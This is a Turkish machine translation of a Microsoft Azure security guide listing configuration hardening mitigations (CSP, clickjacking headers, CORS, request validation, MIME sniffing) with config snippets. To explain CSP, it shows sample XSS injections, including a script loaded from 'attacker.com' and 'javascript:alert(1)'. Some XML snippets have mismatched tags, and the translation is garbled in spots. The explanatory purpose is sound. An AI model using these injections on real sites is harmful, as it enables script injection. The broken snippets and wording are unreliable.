---
title: Microsoft Tehdit Modelleme Aracı için yapılandırma yönetimi
titleSuffix: Azure
description: Tehdit Modelleme Aracı'nda açığa çıkan tehditler için azaltıcı etkenler
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: 3c89fae09583c96cf8139885fe2554cf6784b4e3
ms.sourcegitcommit: 2ec4b3d0bad7dc0071400c2a2264399e4fe34897
ms.translationtype: MT
ms.contentlocale: tr-TR
ms.lasthandoff: 03/28/2020
ms.locfileid: "78269834"
---
# <a name="security-frame-configuration-management--mitigations"></a>Güvenlik Çerçevesi: Yapılandırma Yönetimi | Azaltıcı etken 
| Ürün / Hizmet | Makale |
| --------------- | ------- |
| **Web Uygulaması** | <ul><li>[İçerik Güvenlik İlkesi (CSP) uygulayın ve satır satır lı javascript'i devre dışı](#csp-js)</li><li>[Tarayıcının XSS filtresini etkinleştirme](#xss-filter)</li><li>[ASP.NET uygulamaları, dağıtımdan önce izleme ve hata ayıklamadevre vermemelidir](#trace-deploy)</li><li>[Yalnızca güvenilen kaynaklardan üçüncü taraf javascript'lere erişin](#js-trusted)</li><li>[Kimlik doğrulaması ASP.NET sayfalarının UI Redressing veya click-jacking savunmalarını dahil ettiğinden emin olun](#ui-defenses)</li><li>[ASP.NET Web Uygulamaları'nda CORS etkinse yalnızca güvenilen kökenlere izin verildiğinden emin olun](#cors-aspnet)</li><li>[ASP.NET Sayfalarda İstek özniteliğini doğrulamayı etkinleştirme](#validate-aspnet)</li><li>[JavaScript kitaplıklarının yerel olarak barındırılan en son sürümlerini kullanma](#local-js)</li><li>[Otomatik MIME koklamayı devre dışı](#mime-sniff)</li><li>[Parmak izini almaktan kaçınmak için Windows Azure Web Sitelerindeki standart sunucu üstbilgilerini kaldırma](#standard-finger)</li></ul> |
| **Database** | <ul><li>[Veritabanı Altyapısı erişimi için Windows Güvenlik Duvarı yapılandırma](#firewall-db)</li></ul> |
| **Web API** | <ul><li>[Cors Web API'ASP.NET etkinse yalnızca güvenilen kökenlere izin verildiğinden emin olun](#cors-api)</li><li>[Web API'nin yapılandırma dosyalarının hassas veriler içeren bölümlerini şifreleme](#config-sensitive)</li></ul> |
| **IoT Cihazı** | <ul><li>[Tüm yönetici arabirimlerinin güçlü kimlik bilgileriyle güvenli olduğundan emin olun](#admin-strong)</li><li>[Bilinmeyen kodun aygıtlarda yürütülmediğinden emin olun](#unknown-exe)</li><li>[IoT Cihazının işletim sistemi ve ek bölümlerini bit dolabı ile şifreleme](#partition-iot)</li><li>[Cihazlarda yalnızca minimum hizmetlerin/özelliklerin etkin olduğundan emin olun](#min-enable)</li></ul> |
| **IoT Alan Ağ Geçidi** | <ul><li>[IoT Field Gateway'in işletim sistemi ve ek bölümlerini bit dolabı yla şifreleme](#field-bit-locker)</li><li>[Yükleme sırasında alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin değiştirildiğinden emin olun](#default-change)</li></ul> |
| **IoT Bulut Ağ Geçidi** | <ul><li>[Bulut Ağ Geçidi'nin bağlı aygıtları güncel tutmak için bir işlem uyguladığından emin olun](#cloud-firmware)</li></ul> |
| **Makine Güven Sınırı** | <ul><li>[Aygıtların kuruluş ilkelerine göre yapılandırılan son nokta güvenlik denetimlerine sahip olduğundan emin olun](#controls-policies)</li></ul> |
| **Azure Depolama** | <ul><li>[Azure depolama erişim anahtarlarının güvenli yönetimini sağlayın](#secure-keys)</li><li>[Azure depolama da CORS etkinse yalnızca güvenilen kökenlere izin verildiğini sağlayın](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[WCF'nin hizmet azaltma özelliğini etkinleştirme](#throttling)</li><li>[Meta veriler aracılığıyla WCF-Bilgi açıklaması](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>İçerik Güvenlik İlkesi (CSP) uygulayın ve satır satır lı javascript'i devre dışı

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [İçerik Güvenlik Politikasına Giriş](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [İçerik Güvenlik Politikası Başvurusu](https://content-security-policy.com/), Güvenlik [özellikleri](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), İçerik [güvenlik politikasına giriş](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [CSP kullanabilir miyim?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Adımlar** | <p>İçerik Güvenlik Politikası (CSP), web uygulama sahiplerinin sitelerine gömülü içerik üzerinde denetim sahibi olmasını sağlayan bir W3C standardı olan derinlemesine bir güvenlik mekanizmasıdır. CSP, web sunucusuna HTTP yanıt başlığı olarak eklenir ve istemci tarafında tarayıcılar tarafından uygulanır. Bu beyaz listeye dayalı bir ilkedir - bir web sitesi, JavaScript gibi etkin içeriğin yüklenebileceği bir dizi güvenilir etki alanı bildirebilir.</p><p>CSP aşağıdaki güvenlik avantajlarını sağlar:</p><ul><li>**XSS'ye karşı koruma:** Bir sayfa XSS'ye karşı savunmasızsa, saldırgan sayfadan 2 şekilde yararlanabilir:<ul><li>Enjekte `<script>malicious code</script>`edin. Bu yararlanma CSP'nin Temel Kısıtlaması-1 nedeniyle çalışmaz</li><li>Enjekte `<script src="http://attacker.com/maliciousCode.js"/>`edin. Saldırganın denetlenmişetki alanı CSP' nin etki alanları beyaz listesinde yer alamayacağı için bu yararlanma çalışmaz</li></ul></li><li>**Veri sızma üzerinde kontrol:** Bir web sayfasındaki kötü amaçlı içerik harici bir web sitesine bağlanmaya ve veri çalmaya çalışırsa, bağlantı CSP tarafından iptal edilir. Bunun nedeni, hedef etki alanının CSP'nin beyaz listesinde olmamasıdır.</li><li>**Tıklama kaçırmaya karşı savunma:** tıklama kaçırma, bir düşmanın gerçek bir web sitesini çerçeveleyip kullanıcıları Kullanıcı Bira öğelerini tıklamaya zorlayarak kullanabileceği bir saldırı tekniğidir. Şu anda tıklama kaçırmaya karşı savunma, yanıt üstbilgisi olan X-Frame-Options'ı yapılandırılarak elde edilir. Tüm tarayıcılar bu üstbilgi saygı ve ileri CSP tıklama-jacking karşı savunmak için standart bir yol olacaktır</li><li>**Gerçek zamanlı saldırı raporlaması:** CSP özellikli bir web sitesinde bir enjeksiyon saldırısı varsa, tarayıcılar web sunucusunda yapılandırılan bir uç noktaya bildirimi otomatik olarak tetikler. Bu şekilde, CSP gerçek zamanlı bir uyarı sistemi olarak hizmet vermektedir.</li></ul> |

### <a name="example"></a>Örnek
Örnek ilke: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Bu ilke, komut dosyalarının yalnızca web uygulamasının sunucusundan ve google analytics sunucusundan yüklenmesine olanak tanır. Başka bir siteden yüklenen komut dosyaları reddedilir. Bir web sitesinde CSP etkinleştirildiğinde, XSS saldırılarını azaltmak için aşağıdaki özellikler otomatik olarak devre dışı bırakılır. 

### <a name="example"></a>Örnek
Satır satırkomut dosyaları yürütülmez. Aşağıda satır satırlı komut dosyaları örnekleri verilmiştir 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Örnek
Dizeleri kod olarak değerlendirilmeyecektir. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Tarayıcının XSS filtresini etkinleştirme

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [XSS Koruma Filtresi](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Adımlar** | <p>X-XSS-Protection yanıt üstbilgisi yapılandırması tarayıcının site ler arası komut dosyası filtresini denetler. Bu yanıt üstbilgiaşağıdaki değerlere sahip olabilir:</p><ul><li>`0:`Bu, filtreyi devre dışı</li><li>`1: Filter enabled`Bir site arası komut dosyası saldırısı algılanırsa, saldırıyı durdurmak için tarayıcı sayfayı temizler</li><li>`1: mode=block : Filter enabled`. Sayfayı dezenfekte etmek yerine, bir XSS saldırısı algılandığında, tarayıcı sayfanın görüntülanmasını önler</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Tarayıcı sayfayı dezenfekte eder ve ihlali bildirir.</li></ul><p>Bu, seçtiğiniz bir URI'ye ayrıntıları göndermek için CSP ihlal raporlarını kullanan bir Krom işlevidir. Son 2 seçenek güvenli değerler olarak kabul edilir.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET uygulamaları, dağıtımdan önce izleme ve hata ayıklamadevre vermemelidir

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [ASP.NET Hata Ayıklama Genel Bakış](https://msdn.microsoft.com/library/ms227556.aspx), [ASP.NET İzleme Genel Bakış](https://msdn.microsoft.com/library/bb386420.aspx), [Nasıl: ASP.NET Bir Uygulama için İzleme etkinleştirin](https://msdn.microsoft.com/library/0x5wc973.aspx), [Nasıl: ASP.NET Uygulamaları için Hata Ayıklama etkinleştirin](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Adımlar** | Sayfa için izleme etkinleştirildiğinde, sayfayı isteyen her tarayıcı, iç sunucu durumu ve iş akışı hakkında veri içeren izleme bilgilerini de elde eder. Bu bilgi güvenliğe duyarlı olabilir. Sayfa için hata ayıklama etkinleştirildiğinde, sunucuda meydana gelen hatalar, tarayıcıya sunulan tam yığın izleme verilerine neden olur. Bu veriler, sunucunun iş akışı hakkında güvenliğe duyarlı bilgileri açığa çıkarabilir. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Yalnızca güvenilen kaynaklardan üçüncü taraf javascript'lere erişin

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | Yok  |
| **Adımlar** | üçüncü taraf JavaScript'ler yalnızca güvenilir kaynaklardan başvurulmalıdır. Başvuru uç noktaları her zaman SSL üzerinde olmalıdır. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Kimlik doğrulaması ASP.NET sayfalarının UI Redressing veya click-jacking savunmalarını dahil ettiğinden emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [OWASP click-jacking Savunma Hile Sayfası](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Dahili - X-Frame-Options ile tıklama jacking mücadele](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Adımlar** | <p>"Kullanıcı geri alma saldırısı" olarak da bilinen tıklama kaçırma, bir saldırganın kullanıcıyı üst düzey sayfaya tıklamayı planladıkları sırada başka bir sayfadaki bir düğmeye veya bağlantıyı tıklatması için kandırmak için birden çok saydam veya opak katman kullanmasıdır.</p><p>Bu katmanlama, kurbanın sayfasını yükleyen bir iframe ile kötü amaçlı bir sayfa oluşturarak elde edilir. Bu nedenle, saldırgan kendi sayfası için direnen tıklamaları "kaçırmak" ve büyük olasılıkla başka bir uygulama, etki alanı veya her ikisine ait başka bir sayfaya yönlendirme. Tıklama kaçırma saldırılarını önlemek için, tarayıcıya diğer etki alanlarından çerçevelemeye izin vermemelerini söyleyen uygun X-Frame-Options HTTP yanıt üstbilgisini ayarlayın</p>|

### <a name="example"></a>Örnek
X-FRAME-OPTIONS üstbilgisi IIS web.config üzerinden ayarlanabilir. Web.config kodu çerçeveli asla siteler için snippet: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Örnek
Yalnızca aynı etki alanında sayfalar tarafından çerçevelenmiş olması gereken siteler için Web.config kodu: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>ASP.NET Web Uygulamaları'nda CORS etkinse yalnızca güvenilen kökenlere izin verildiğinden emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Web Formları, MVC5 |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | Yok  |
| **Adımlar** | <p>Tarayıcı güvenliği, bir web sitesinin başka bir etki alanına AJAX istekleri göndermesini engeller. Bu kısıtlama ya aynı kaynak ilkesi olarak adlandırılır ve kötü amaçlı bir sitenin başka bir siteden gelen hassas verileri okumasını engeller. Ancak, bazen diğer sitelerin tüketebileceği API'leri güvenli bir şekilde ortaya çıkarmak gerekebilir. Cross Origin Kaynak Paylaşımı (CORS), bir sunucunun aynı kaynak ilkesini gevşetmesine olanak tanıyan bir W3C standardıdır. CORS'i kullanan sunucu, diğerlerini reddederken bazı kişiler arası isteklere açıkça izin verebilir.</p><p>CORS, JSONP gibi önceki tekniklere göre daha güvenli ve daha esnektir. Özünde, CORS etkinleştirme web uygulamasına birkaç HTTP yanıt başlıkları (Access-Control-*) ekleyerek çevirir ve bu birkaç şekilde yapılabilir.</p>|

### <a name="example"></a>Örnek
Web.config erişimi varsa, cors aşağıdaki kod aracılığıyla eklenebilir: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Örnek
web.config erişimi yoksa, cors aşağıdaki CSharp kodu ekleyerek yapılandırılabilir: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

"Access-Control-Allow-Allow-Origin" özniteliğindeki kaynak listesinin sınırlı ve güvenilir bir menşe kümesine ayarlandığından emin olmak için önemli olduğunu lütfen unutmayın. Bunu uygunsuz bir şekilde yapılandırılamaması (örneğin, değeri '*' olarak ayarlamak), kötü amaçlı sitelerin web uygulamasına çapraz menşe isteklerini herhangi bir kısıtlama olmaksızın >tetiklemesine ve böylece uygulamayı CSRF saldırılarına karşı savunmasız hale getirecektir. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>ASP.NET Sayfalarda İstek özniteliğini doğrulamayı etkinleştirme

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Web Formları, MVC5 |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [İstek Doğrulama - Betik Saldırılarını Önleme](https://www.asp.net/whitepapers/request-validation) |
| **Adımlar** | <p>Sürüm 1.1'den bu yana ASP.NET özelliği olan istek doğrulaması, sunucunun kodlanmamış HTML içeren içeriği kabul etmesini engeller. Bu özellik, istemci komut dosyası kodu veya HTML bilmeden bir sunucuya gönderilebilir, saklanır ve daha sonra diğer kullanıcılara sunulan bazı komut dosyası enjeksiyon saldırıları önlemeye yardımcı olmak için tasarlanmıştır. Yine de tüm giriş verilerini doğrulamanızı ve uygun olduğunda HTML kodlamanızı şiddetle öneririz.</p><p>İstek doğrulama, tüm giriş verileri tehlikeli olabilecek değerler listesiyle karşılaştırılarak gerçekleştirilir. Bir eşleşme oluşursa, `HttpRequestValidationException`ASP.NET yükseltir. Varsayılan olarak, İstek Doğrulama özelliği etkinleştirilir.</p>|

### <a name="example"></a>Örnek
Ancak, bu özellik sayfa düzeyinde devre dışı olabilir: 
```XML
<%@ Page validateRequest="false" %> 
```
veya, uygulama düzeyinde 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
İstek Doğrulama özelliğinin desteklenmediğini ve MVC6 boru hattının bir parçası olmadığını lütfen unutmayın. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>JavaScript kitaplıklarının yerel olarak barındırılan en son sürümlerini kullanma

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | Yok  |
| **Adımlar** | <p>JQuery gibi standart JavaScript kitaplıklarını kullanan geliştiriciler, bilinen güvenlik açıklarını içermeyen ortak JavaScript kitaplıklarının onaylı sürümlerini kullanmalıdır. Eski sürümlerinde bilinen güvenlik açıkları için güvenlik düzeltmeleri içerdiğinden, iyi bir uygulama kitaplıkların en son sürümünü kullanmaktır.</p><p>Uyumluluk nedeniyle en son sürüm kullanılamıyorsa, aşağıdaki minimum sürümler kullanılmalıdır.</p><p>Kabul edilebilir minimum sürümler:</p><ul><li>**Jquery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Doğrulama 1.9</li><li>JQuery Mobil 1.0.1</li><li>JQuery Döngüsü 2.99</li><li>JQuery Veri Tabloları 1.9.0</li></ul></li><li>**AJAX Denetim Araç Seti**<ul><li>Ajax Kontrol Araç Seti 40412</li></ul></li><li>**ASP.NET Web Formları ve Ajax**<ul><li>ASP.NET Web Forms ve Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Genel CDN'ler gibi harici sitelerden hiçbir JavaScript kitaplığı yüklemeyin</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Otomatik MIME koklamayı devre dışı

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [IE8 Güvenlik Bölüm V: Kapsamlı Koruma](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME tipi](https://en.wikipedia.org/wiki/Mime_type) |
| **Adımlar** | X-İçerik Türü Seçenekleri üstbilgisi, geliştiricilerin içeriklerinin MIME koklanmaması gerektiğini belirtmelerine olanak tanıyan bir HTTP üstbilgidir. Bu üstbilgi, MIME Koklama saldırılarını azaltmak için tasarlanmıştır. Kullanıcı denetlenebilir içerik içerebilen her sayfa için HTTP Üstbilgi X İçerik Türü Seçenekleri:nosniff'i kullanmanız gerekir. Uygulamadaki tüm sayfalar için gerekli üstbilginin genel olarak etkin olmasını sağlamak için aşağıdakilerden birini yapabilirsiniz|

### <a name="example"></a>Örnek
Uygulama Internet Information Services (IIS) tarafından barındırılan 7 web.config dosyasına üstbilgi ekleyin. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Örnek
Genel Uygulama\_BeginRequest üzerinden üstbilgi ekleme 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Örnek
Özel HTTP modüllerini uygulayın 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Örnek
Tek tek yanıtlara ekleyerek yalnızca belirli sayfalar için gerekli üstbilgiyi etkinleştirebilirsiniz: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Parmak izini almaktan kaçınmak için Windows Azure Web Sitelerindeki standart sunucu üstbilgilerini kaldırma

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | EnvironmentType - Azure |
| **Başvurular**              | [Windows Azure Web Sitelerindestandart sunucu üstbilgilerini kaldırma](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Adımlar** | Server, X-Powered-By, X-AspNet-Version gibi başlıklar sunucu ve temel teknolojiler hakkında bilgi ortaya çıkarır. Bu başlıkları bastırmak ve uygulamanın parmak izini önlemek için önerilir |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Veritabanı Altyapısı erişimi için Windows Güvenlik Duvarı yapılandırma

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Database | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | SQL Azure, OnPrem |
| **Öznitelikler**              | N/A, SQL Sürümü - V12 |
| **Başvurular**              | [Azure SQL veritabanı güvenlik duvarı nasıl yapılandırılabilen](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/)veritabanı [altyapısı, Veritabanı Altyapısı Erişimi için Windows Güvenlik Duvarı Yapılandırma](https://msdn.microsoft.com/library/ms175043) |
| **Adımlar** | Güvenlik duvarı sistemleri bilgisayar kaynaklarına yetkisiz erişimi önlemeye yardımcı olur. Bir güvenlik duvarı üzerinden SQL Server Database Engine bir örneğine erişmek için, erişim sağlamak için SQL Server çalıştıran bilgisayarda güvenlik duvarı yapılandırmanız gerekir |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Cors Web API'ASP.NET etkinse yalnızca güvenilen kökenlere izin verildiğinden emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web API | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | MVC 5 |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | ASP.NET Web API 2, ASP.NET Web API'de [Origin'İstekleri Etkinleştirme](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api) [- ASP.NET Web API 2'de CORS Desteği](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Adımlar** | <p>Tarayıcı güvenliği, bir web sitesinin başka bir etki alanına AJAX istekleri göndermesini engeller. Bu kısıtlama ya aynı kaynak ilkesi olarak adlandırılır ve kötü amaçlı bir sitenin başka bir siteden gelen hassas verileri okumasını engeller. Ancak, bazen diğer sitelerin tüketebileceği API'leri güvenli bir şekilde ortaya çıkarmak gerekebilir. Cross Origin Kaynak Paylaşımı (CORS), bir sunucunun aynı kaynak ilkesini gevşetmesine olanak tanıyan bir W3C standardıdır.</p><p>CORS'i kullanan sunucu, diğerlerini reddederken bazı kişiler arası isteklere açıkça izin verebilir. CORS, JSONP gibi önceki tekniklere göre daha güvenli ve daha esnektir.</p>|

### <a name="example"></a>Örnek
App_Start/WebApiConfig.cs'de, WebApiConfig.Register yöntemine aşağıdaki kodu ekleyin 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Örnek
EnableCors özniteliği aşağıdaki gibi bir denetleyicide eylem yöntemlerine uygulanabilir: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

EnableCors özniteliğindeki kaynak listesinin sınırlı ve güvenilir bir menşe kümesine ayarlandığından emin olmak için önemli olduğunu lütfen unutmayın. Bunu uygunsuz bir şekilde yapılandırılamaması (örneğin, değeri '*' olarak ayarlamak), kötü amaçlı sitelerin herhangi bir kısıtlama olmaksızın API'ye çapraz kaynak isteklerini tetiklemesine >böylece API'yi CSRF saldırılarına karşı savunmasız hale getirir. EnableCors denetleyici düzeyinde dekore edilebilir. 

### <a name="example"></a>Örnek
Bir sınıftaki belirli bir yöntemde CORS'u devre dışı kılabilir için, DisableCors özniteliği aşağıda gösterildiği gibi kullanılabilir: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web API | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | MVC 6 |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [ASP.NET Çekirdek 1.0'da Origin'ASP.NET İstekleri (CORS) etkinleştirme](https://docs.asp.net/en/latest/security/cors.html) |
| **Adımlar** | <p>Core 1.0ASP.NETde CORS ara yazılım veya MVC kullanılarak etkinleştirilebilir. CORS'i etkinleştirmek için MVC kullanırken aynı CORS hizmetleri kullanılır, ancak CORS ara yazılımı kullanılmaz.</p>|

**Yaklaşım-1** Ara yazılımla CORS'i etkinleştirme: Tüm uygulama için CORS'i etkinleştirmek için UseCors uzatma yöntemini kullanarak istek ardışık lığına CORS ara yazılımEkleyin. CorsPolicyBuilder sınıfını kullanarak CORS ara yazılımını eklerken bir çapraz orijin ilkesi belirtilebilir. Bunu yapmak için iki yol vardır:

### <a name="example"></a>Örnek
İlki usecors'u lambda ile aramak. Lambda bir CorsPolicyBuilder nesne alır: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Örnek
İkincisi, bir veya daha fazla adlandırılmış CORS ilkeleri tanımlamak ve daha sonra çalışma zamanında ada göre ilke seçmektir. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Yaklaşım-2** MVC'de CORS'u etkinleştirme: Geliştiriciler alternatif olarak mvc'yi tüm denetleyiciler için eylem başına, denetleyici başına veya genel olarak belirli CORS'leri uygulamak için kullanabilir.

### <a name="example"></a>Örnek
Eylem başına: Belirli bir eylem için bir CORS ilkesi belirtmek için eyleme [EnableCors] özniteliği ekleyin. İlke adını belirtin. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Örnek
Denetleyici başına: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Örnek
Genel: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
